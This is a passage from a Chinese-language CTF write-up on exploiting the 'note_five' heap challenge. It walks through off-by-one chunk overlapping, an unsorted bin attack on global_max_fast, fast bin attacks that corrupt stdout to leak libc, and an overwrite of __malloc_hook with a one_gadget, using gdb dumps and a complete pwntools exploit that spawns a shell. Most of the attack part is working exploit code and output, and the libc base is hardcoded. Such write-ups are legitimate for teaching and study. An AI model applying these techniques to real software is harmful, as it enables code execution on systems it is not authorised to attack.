    0x555555758180: 0x0000000000000000      0x0000000000000000
## Chunk Extend and Overlapping
删除2号，`free`过程根据`prev_chunk_inuse`触发空闲块合并，并根据`prev_chunk_size`偏移找到0号，合并为一个大小为`0x1E0(0x140+0xa0)`的`unsorted
bins chunk`
堆块如下：
    pwndbg> heapls
               ADDR             SIZE            STATUS
    sbrk_base  0x555555758000
    chunk      0x555555758000   0x1e0           (F) FD 0x7ffff7dd5b78 BK 0x7ffff7dd5b78 (LC)
    chunk      0x5555557581e0   0xa0            (inuse)
    chunk      0x555555758280   0x20d80         (top)
    sbrk_end   0x555555779000
    pwndbg> x /10gx 0x555555758000
    0x555555758000: 0x0000000000000000      0x00000000000001e1
    0x555555758010: 0x00007ffff7dd5b78      0x00007ffff7dd5b78
    0x555555758020: 0x0000000000000000      0x0000000000000000
    0x555555758030: 0x0000000000000000      0x0000000000000000
    0x555555758040: 0x0000000000000000      0x0000000000000000
## Unsorted Bins Attack
使用`Unsorted Bins Attack`修改`global_max_fast`
    create(0,0xe8)
    # 从unsorted bin chunk中分割一块使用
    global_max_fast_addr =  0x7ffff7dd7848
    edit(1,"A"*0x40 + p64(0) + p64(0xf1) + p64(0) + p64(global_max_fast_addr -0x10))
    raw_input("3")
    create(4,0xe8)
    #通过1号info设置剩余的unsorted bins chunk，unsorted bin attack，修改global_max_fast
创建0号，大小为`0xe8`，会从`unsorted bin chunk`中分割一块用于分配。
此时`unsorted bins chunk`中包含可控的1号，且地址为`0x5555557580a0`，使其覆盖到剩余未分配`unsorted bin
chunk`。
    pwndbg> heapls
               ADDR             SIZE            STATUS
    sbrk_base  0x555555758000
    chunk      0x555555758000   0xf0            (inuse)
    chunk      0x5555557580f0   0xf0            (F) FD 0x0 BK 0x7ffff7dd7838
    chunk      0x5555557581e0   0xa0            (inuse)
    chunk      0x555555758280   0x20d80         (top)
    sbrk_end   0x555555779000
    pwndbg> x /50gx 0x5555557580a0
    0x5555557580a0: 0x00000000000000a0      0x00000000000000a0
    0x5555557580b0: 0x4141414141414141      0x4141414141414141
    0x5555557580c0: 0x4141414141414141      0x4141414141414141
    0x5555557580d0: 0x4141414141414141      0x4141414141414141
    0x5555557580e0: 0x4141414141414141      0x4141414141414141
    0x5555557580f0: 0x0000000000000000      0x00000000000000f1
    0x555555758100: 0x0000000000000000      0x00007ffff7dd7838
创建4号，将`global_max_fast`修改为`unsorted_chunks(av)`
    pwndbg> p /x global_max_fast
    $2 = 0x7ffff7dd5b78
值很大，此时题目中创建的堆块都会被当做`fast bin chunk`进行处理。
## Fast Bin Attack Arbitrary Alloc Laek Libc
    delete(4)
    #删除并放入fast bins
    edit(1,"A"*0x40 + p64(0) + p64(0xf1) +p16(0x65cf))
    #fast bin attack 修改第二次申请的地址为stdout附近
    create(2,0xe8)
    create(4,0xe8)
    raw_input("4")
    #覆盖stdout属性
    edit(4,"A"*0x41 + p64(0xfbad1800) + p64(0)*3 + '\x40')
    #泄露Libc相关地址
    leak = u64(p.recvline()[1:8].ljust(8, '\x00'))
    #raw_input("5")
    log.success("leak addr :" + hex(leak))
    libc_base = leak -  (leak - 0x7ffff7a49000)
    log.success("libc_addr :" + hex(libc_base))
    #计算相关地址
    libc = ELF("./libc.debug.so")
    one_gadget = libc_base + 0x3d169
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    realloc = libc_base + libc.symbols['__libc_realloc']
    stdin = libc_base + libc.symbols['_IO_2_1_stdin_']
删除4号，并再次通过1号进行覆盖，连续分配两次，通过`fast bin
attack`在第二次分配时实现任意地址分配，分配到`stdout`附近。覆盖`stdout`中的`flag`和`_IO_write_base`，泄露Libc相关地址。
    pwndbg> p stdout
    $3 = (struct _IO_FILE *) 0x7ffff7dd6620 
    pwndbg> x /10gx 0x7ffff7dd6620
    0x7ffff7dd6620 :       0x00000000fbad1800      0x0000000000000000
    0x7ffff7dd6630 :    0x0000000000000000      0x0000000000000000
    0x7ffff7dd6640 :    0x00007ffff7dd6640      0x00007ffff7dd66a3
    0x7ffff7dd6650 :    0x00007ffff7dd66a3      0x00007ffff7dd66a3
    0x7ffff7dd6660 :    0x00007ffff7dd66a4      0x0000000000000000
## Overwrite `__malloc_hook` `__realloc_hook`
    delete(2) #加入fast bin中
    edit(1,'A'*0x40 + p64(0) + p64(0xf1) +p64(stdin + 0x8f)) #覆盖并利用fast bin attack指定预分配地址
    create(2,0xe8)
    create(4,0xe8)
    edit(4,'A'*0xe0 + p64(0) + p64(0xf1)) #覆盖并创建合适的chunk header用于下次申请的chunk覆盖__malloc_hook 和 __realloc_hook
`fast bins`分配的过程中会根据申请空间大小`0xe8`的计算`idx`和与分配地址的计算的idx是否相同， 主要是根据`chunk
size`进行计算。
在能够包含`__malloc_hook` 和 `__realloc_hook`附近没有合适的位置(chunk size)可以用作分配的chunk
，但是有更远处却符合分配`chunk`。先分配较远位置作为跳板，创建合适的`chunk header`用于下次申请能够覆盖`__malloc_hook`
和`__realloc_hook`的`chunk`。
    pwndbg> x /10gx 0x555555756080
    0x555555756080: 0x0000555555758010      0x00005555557580b0
    0x555555756090: 0x0000555555758100      0x00005555557581f0
    0x5555557560a0: 0x00007ffff7dd597f      0x2e00725f6e6f6973
    0x5555557560b0: 0x6e79642e616c6572      0x2e0074696e692e00
    0x5555557560c0: 0x746c702e00746c70      0x65742e00746f672e
    pwndbg> x /60gx  0x00007ffff7dd596f
    0x7ffff7dd596f :    0xffffffffffffff00      0x00000000000000ff
    0x7ffff7dd597f :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd598f :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd599f :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd59af :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd59bf :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd59cf :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd59df :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd59ef :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd59ff :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd5a0f :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd5a1f :    0x4141414141414141      0x4141414141414141
    0x7ffff7dd5a2f :   0x4141414141414141      0x4141414141414141
    0x7ffff7dd5a3f :   0x4141414141414141      0x4141414141414141
    0x7ffff7dd5a4f :   0x4141414141414141      0x4141414141414141
    0x7ffff7dd5a5f :   0x0000000000000000      0x00000000000000f1
    0x7ffff7dd5a6f :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5a7f :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5a8f :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5a9f :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5aaf :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5abf :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5acf :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5adf :   0x0000000000000000      0x0000000000000000
    0x7ffff7dd5aef :   0x007ffff7dd426000      0x0000000000000000
    0x7ffff7dd5aff: 0x007ffff7abea5100      0x007ffff7abea1200
    0x7ffff7dd5b0f :      0x0000000000000000      0x0000000000000000
    0x7ffff7dd5b1f: 0x0000000000000000      0x0000000000000000
再次分配且chunk位置为前面构造处，包含`__malloc_hook` 和`__realloc_hook`的`chunk`。
    delete(2)
    edit(1, 'B'*0x40 +p64(0) +p64(0xf1) + p64(malloc_hook -0xb1))
    create(2,0xe8)
    create(4,0xe8)
    edit(4,'A'*(0xb1 - 0x8 -0x10) + p64(one_gadget) + p64(realloc + 2))
    # 覆盖__realloc_hook为one_gadget，__malloc_hook为realloc + 2
    create(4,0xe8)
    p.interactive()
覆盖`__realloc_hook`为one_gadget，`__malloc_hook`为`realloc +
2`，利用`realloc`调整rsp使one_gadget更加稳定。
    root@10-8-163-191:~/# one_gadget libc.debug.so
    0x3d169 execve("/bin/sh", rsp+0x20, environ)
    constraints:
      [rsp+0x20] == NULL
    0x3d16e execve("/bin/sh", rsi, environ)
    constraints:
      [rsi] == NULL || rsi == NULL
    0xcf2ac execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
## exp
整理集合一下
    #coding=utf-8
    from pwn import *
    import struct
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    p = process("./note_five")
    pwnlib.gdb.attach(p)
    def create(idx,size):
        p.sendlineafter("choice>>",str(1))
        p.sendlineafter("idx:",str(idx))
        p.sendlineafter("size:",str(size))
    def edit(idx,content):
        p.sendlineafter("choice>>",str(2))
        p.sendlineafter("idx:",str(idx))
        p.sendlineafter("content:",content)
    def delete(idx):
        p.sendlineafter("choice>>", str(3))
        p.sendlineafter("idx:", str(idx))
    #创建四个chunk
    create(0,0x98)
    create(1,0x98)
    create(2,0x98)
    create(3,0x98) #隔离chunk，防止和top chunk合并
    delete(0)
    edit(1,"A"*0x90 + p64(0x140) + p8(0xa0))
    # off bu one overwrite next chunk(chunk2) szie and prev_size
    delete(2)
    #unsorted bins chunk extend  Overlapping
    create(0,0xe8)
    # 从unsorted bin chunk中分割一块
    global_max_fast_addr =  0x7ffff7dd7848
    edit(1,"A"*0x40 + p64(0) + p64(0xf1) + p64(0) + p64(global_max_fast_addr -0x10))
    create(4,0xe8)
    #通过1号info设置剩下的unsorted bins chunk，unsorted bin attack，修改global_max_fast
    delete(4)
    #删除并放入fast bins
    edit(1,"A"*0x40 + p64(0) + p64(0xf1) +p16(0x65cf))
    #fast bin attack 修改第二次申请的地址为stdout附近
    create(2,0xe8)
    create(4,0xe8)
    edit(4,"A"*0x41 + p64(0xfbad1800) + p64(0)*3 + '\x40')
    #覆盖stdout，泄露Libc相关地址
    leak = u64(p.recvline()[1:8].ljust(8, '\x00'))
    log.success("leak addr :" + hex(leak))
    libc_base = leak -  (leak - 0x7ffff7a49000)
    log.success("libc_addr :" + hex(libc_base))
    libc = ELF("./libc.debug.so")
    one_gadget = libc_base + 0x3d169
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    realloc = libc_base + libc.symbols['__libc_realloc']
    stdin = libc_base + libc.symbols['_IO_2_1_stdin_']
    print "one_gadget-> " + hex(one_gadget)
    print "malloc_hook-> " + hex(malloc_hook)
    print "realloc-> " + hex(realloc)
    print "stdin-> " + hex(stdin)
    delete(2)
    edit(1,'A'*0x40 + p64(0) + p64(0xf1) +p64(stdin + 0x8f))
    create(2,0xe8)
    create(4,0xe8)
    edit(4,'A'*0xe0 + p64(0) + p64(0xf1))
    delete(2)
    edit(1, 'B'*0x40 +p64(0) +p64(0xf1) + p64(malloc_hook -0xb1))
    create(2,0xe8)
    create(4,0xe8)
    edit(4,'A'*(0xb1 - 0x8 -0x10) + p64(one_gadget) + p64(realloc + 2))
    create(4,0xe8)
    p.interactive()
# 参考